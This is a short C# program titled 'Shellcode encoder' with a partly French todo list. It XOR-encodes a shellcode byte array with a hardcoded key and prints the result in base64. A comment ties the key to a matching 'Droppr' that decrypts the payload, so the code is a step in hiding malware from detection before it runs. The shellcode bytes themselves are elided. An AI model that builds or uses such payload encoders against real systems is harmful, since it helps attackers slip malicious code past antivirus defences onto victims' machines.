/*
Shellcode encoder

todo :
- add compressor algos
-- gzip
-- bzip
-- zip

- add crypto algos
-- AES
-- Twofish
-- RC6

- sortie
-- base64 (ok)
-- raw
-- tableau de bytes copier/collable

- input
-- fichier raw

*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Encrypter
{
    internal class Program
    {
        private static byte[] xor(byte[] shell, byte[] KeyBytes)
        {
            for (int i = 0; i < shell.Length; i++)
            {
                shell[i] ^= KeyBytes[i % KeyBytes.Length];
            }
            return shell;
        }

        static void Main(string[] args)
        {
            //XOR Key - It has to be the same in the Droppr for Decrypting
            string key = "lOKYojMBhTbE8xqb";

            //Convert Key into bytes
            byte[] keyBytes = Encoding.ASCII.GetBytes(key);

            //shellcode
            byte[] buf = new byte[460] {0xfc ....... 0xd5};


            //XORing byte by byte and saving into a new array of bytes
            byte[] encoded = xor(buf, keyBytes);
            Console.WriteLine(Convert.ToBase64String(encoded));        
        }
    }
}